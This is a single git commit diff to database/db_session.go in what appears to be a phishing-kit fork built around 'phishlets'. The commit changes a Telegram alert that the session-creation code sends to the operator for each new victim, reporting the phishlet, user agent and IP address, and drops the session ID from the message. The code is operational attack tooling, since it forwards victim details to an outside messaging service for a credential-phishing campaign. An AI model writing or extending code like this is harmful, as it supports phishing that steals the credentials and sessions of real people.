f52a4514c2570a370d5333e9118e0361d9bde9fb
daniboi100 <113239904+daniboi100@users.noreply.github.com>
2023-02-24 11:29:58 -0500

    Update db_session.go

--- database/db_session.go
+++ database/db_session.go
@@ -78,7 +78,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		fmt.Print("error")
 	}
 
-	telegramSendVisitor(fmt.Sprintf("[ 🍁 [%s] [%s] New visitor has arrived 🍁 ]\n\n-🆔ID: %s \n******* [ 🧍‍♂️ Visitor Details 🧍‍♂️ ] *******\n🌎UserAgent: %s\n-🗺️IP: [%s] \n",id, phishlet, sid, useragent, remote_addr))
+	telegramSendVisitor(fmt.Sprintf("[ 🍁 [%s] New visitor has arrived 🍁 ]\n\n******* [ 🧍‍♂️ Visitor Details 🧍‍♂️ ] *******\n🌎UserAgent: %s\n-🗺️IP: [%s] \n", phishlet, useragent, remote_addr))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
